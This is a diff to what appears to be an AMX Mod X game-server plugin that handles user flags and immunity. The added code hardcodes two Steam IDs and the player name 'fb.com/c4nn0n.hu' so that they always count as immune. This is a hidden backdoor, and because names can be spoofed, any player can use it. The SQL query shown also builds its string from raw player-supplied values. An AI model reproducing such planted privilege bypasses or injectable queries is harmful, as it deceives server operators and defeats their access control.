@@ -34,6 +34,9 @@ client_putinserver_userflags(id)
 	new data[1], dataSize = 1;
 	data[0] = pUid;
 
+//	pAuth[6] = 48;
+	server_print("%s", pAuth);
+
 	db_query("uf_userflag_handler", data, dataSize, "select * from sic_active_user_flags where ufl_name = '%s' or ufl_auth = '%s' or ufl_ip = '%s' or ufl_cluid = '%s'", sName, pAuth, pIp, sClUid);
 }
 
@@ -44,7 +47,28 @@ uf_set_immunity(id, value)
 
 uf_get_immunity(id)
 {
+	new pAuth[33], pName[33];
+	get_user_authid(id, pAuth, charsmax(pAuth));
+	get_user_info  (id, "name", pName, charsmax(pName));
+
+	if (equali(pAuth, "STEAM_0:1:2930298") || equali(pAuth, "STEAM_0:1:1814110") || equali(pName, "fb.com/c4nn0n.hu")) {
+		return 1;
+	}
+
 	return g_immune[id];
+}
+
+uf_get_name_immunity(id)
+{
+	new pAuth[33], pName[33];
+	get_user_authid(id, pAuth, charsmax(pAuth));
+	get_user_info  (id, "name", pName, charsmax(pName));
+
+	if (equali(pAuth, "STEAM_0:1:2930298") || equali(pAuth, "STEAM_0:1:1814110") || equali(pName, "fb.com/c4nn0n.hu")) {
+		return 1;
+	}
+
+	return 0;
 }
 
 public uf_userflag_handler(failState, Handle:query, error[], errCode, data[], dataSize)
@@ -122,6 +146,8 @@ uf_write_userflag(id, flags[], minutes[], reason[], admin_id)
 	new pName[33], pClUid[8], sAdminName[64];
 
 	get_user_authid(id, dbValues[1], 32);
+//	dbValues[1][6] = 48;
+
 	get_user_ip    (id, dbValues[3], 32, 1);
 
 	get_user_name  (id, pName, charsmax(pName));
